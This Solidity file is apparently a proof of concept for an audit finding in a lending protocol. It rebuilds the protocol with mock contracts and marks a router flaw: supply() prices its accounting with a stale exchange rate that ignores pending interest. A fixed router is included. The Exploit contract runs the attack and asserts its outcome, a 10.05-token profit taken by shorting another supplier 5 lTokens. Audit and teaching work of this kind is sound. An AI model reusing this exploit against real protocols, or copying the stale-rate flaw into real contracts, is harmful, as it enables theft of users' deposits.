// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  LEND V2 — H-9 (Sherlock 2025-05). CoreRouter.supply reads exchangeRateStored
    before mint, so pending interest is ignored. The router books more lTokens
    than mint actually issued, then redeem burns that inflated amount out of
    the lTokens other suppliers already own. 2010 underlying comes back as
    2020.05. The other supplier is short 5 lTokens. The control reads
    exchangeRateCurrent and is repaid exactly 2010.
*/

contract Token {
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LToken {
    Token public immutable underlying;
    uint256 public totalSupply;
    uint256 public totalBorrows;
    uint256 public totalReserves;
    uint256 public accrualBlockTimestamp;
    bool public accrued;
    mapping(address => uint256) public balanceOf;

    constructor(Token _underlying) {
        underlying = _underlying;
    }

    function seed(address router, uint256 supply, uint256 borrows, uint256 cash) external {
        balanceOf[router] = supply;
        totalSupply = supply;
        totalBorrows = borrows;
        underlying.mint(address(this), cash);
        accrualBlockTimestamp = block.timestamp == 0 ? 0 : block.timestamp - 1;
    }

    function getCashPrior() public view returns (uint256) {
        return underlying.balanceOf(address(this));
    }

    function exchangeRateStored() public view returns (uint256) {
        if (totalSupply == 0) return 1e18;
        uint256 cashPlusBorrowsMinusReserves = getCashPrior() + totalBorrows - totalReserves;
        return (cashPlusBorrowsMinusReserves * 1e18) / totalSupply;
    }

    function accrueInterest() public {
        if (accrued || block.timestamp == accrualBlockTimestamp || totalBorrows == 0) {
            accrualBlockTimestamp = block.timestamp;
            accrued = true;
            return;
        }
        totalBorrows += totalBorrows / 100;
        accrualBlockTimestamp = block.timestamp;
        accrued = true;
    }

    function exchangeRateCurrent() public returns (uint256) {
        accrueInterest();
        return exchangeRateStored();
    }

    function mint(uint256 amount) external returns (uint256) {
        accrueInterest();
        uint256 rate = exchangeRateStored();
        require(underlying.transferFrom(msg.sender, address(this), amount), "pull");
        uint256 tokens = (amount * 1e18) / rate;
        balanceOf[msg.sender] += tokens;
        totalSupply += tokens;
        return 0;
    }

    function redeem(uint256 tokens) external returns (uint256) {
        accrueInterest();
        uint256 rate = exchangeRateStored();
        uint256 underlyingOut = (tokens * rate) / 1e18;
        balanceOf[msg.sender] -= tokens;
        totalSupply -= tokens;
        require(underlying.transfer(msg.sender, underlyingOut), "push");
        return 0;
    }
}

contract CoreRouter {
    Token public immutable token;
    LToken public immutable lToken;
    mapping(address => uint256) public totalInvestment;

    constructor(Token _token, LToken _lToken) {
        token = _token;
        lToken = _lToken;
    }

    function setInvestment(address user, uint256 amount) external {
        totalInvestment[user] = amount;
    }

    function supply(uint256 _amount, address) external {
        require(_amount > 0, "Zero supply amount");
        require(token.transferFrom(msg.sender, address(this), _amount), "pull");
        token.approve(address(lToken), _amount);
        // @> VULN: exchangeRateStored ignores pending interest, so mintTokens exceeds the lTokens mint() actually issues
        uint256 exchangeRateBefore = lToken.exchangeRateStored();
        require(lToken.mint(_amount) == 0, "Mint failed");
        uint256 mintTokens = (_amount * 1e18) / exchangeRateBefore;
        totalInvestment[msg.sender] += mintTokens;
    }

    function redeem(uint256 _amount, address) external returns (uint256) {
        require(_amount > 0, "Zero redeem amount");
        require(totalInvestment[msg.sender] >= _amount, "Insufficient balance");
        uint256 exchangeRateBefore = lToken.exchangeRateStored();
        uint256 expectedUnderlying = (_amount * exchangeRateBefore) / 1e18;
        require(lToken.redeem(_amount) == 0, "Redeem failed");
        require(token.transfer(msg.sender, expectedUnderlying), "pay");
        totalInvestment[msg.sender] -= _amount;
        return 0;
    }
}

contract CoreRouterFixed {
    Token public immutable token;
    LToken public immutable lToken;
    mapping(address => uint256) public totalInvestment;

    constructor(Token _token, LToken _lToken) {
        token = _token;
        lToken = _lToken;
    }

    function supply(uint256 _amount) external {
        require(token.transferFrom(msg.sender, address(this), _amount), "pull");
        token.approve(address(lToken), _amount);
        uint256 exchangeRateBefore = lToken.exchangeRateCurrent();
        require(lToken.mint(_amount) == 0, "Mint failed");
        uint256 mintTokens = (_amount * 1e18) / exchangeRateBefore;
        totalInvestment[msg.sender] += mintTokens;
    }

    function redeem(uint256 _amount) external {
        require(totalInvestment[msg.sender] >= _amount, "Insufficient balance");
        uint256 exchangeRateBefore = lToken.exchangeRateStored();
        uint256 expectedUnderlying = (_amount * exchangeRateBefore) / 1e18;
        require(lToken.redeem(_amount) == 0, "Redeem failed");
        require(token.transfer(msg.sender, expectedUnderlying), "pay");
        totalInvestment[msg.sender] -= _amount;
    }
}

contract Exploit {
    uint256 public constant SUPPLY_AMT = 2010 ether;
    uint256 public constant VICTIM_LTOKENS = 10000 ether;
    address public constant VICTIM = 0x00000000000000000000000000000000000000B0;

    Token public token;
    LToken public lToken;
    CoreRouter public router;
    uint256 public profit;
    uint256 public booked;
    uint256 public victimShort;

    constructor() {
        token = new Token();
        lToken = new LToken(token);
        router = new CoreRouter(token, lToken);
        lToken.seed(address(router), VICTIM_LTOKENS, 10000 ether, 10000 ether);
        router.setInvestment(VICTIM, VICTIM_LTOKENS);
        token.mint(address(this), SUPPLY_AMT);
    }

    function run() external {
        uint256 start = token.balanceOf(address(this));
        uint256 stale = lToken.exchangeRateStored();
        token.approve(address(router), SUPPLY_AMT);
        router.supply(SUPPLY_AMT, address(token));
        booked = router.totalInvestment(address(this));
        uint256 actual = lToken.balanceOf(address(router)) - VICTIM_LTOKENS;
        router.redeem(booked, address(lToken));
        profit = token.balanceOf(address(this)) - start;
        victimShort = VICTIM_LTOKENS - lToken.balanceOf(address(router));
        require(stale == 2 ether, "stale");
        require(actual == 1000 ether, "minted");
        require(booked == 1005 ether, "booked");
        require(profit == 10.05 ether, "stole");
        require(victimShort == 5 ether, "short");
        require(token.balanceOf(address(this)) == 2020.05 ether, "end");
    }
}
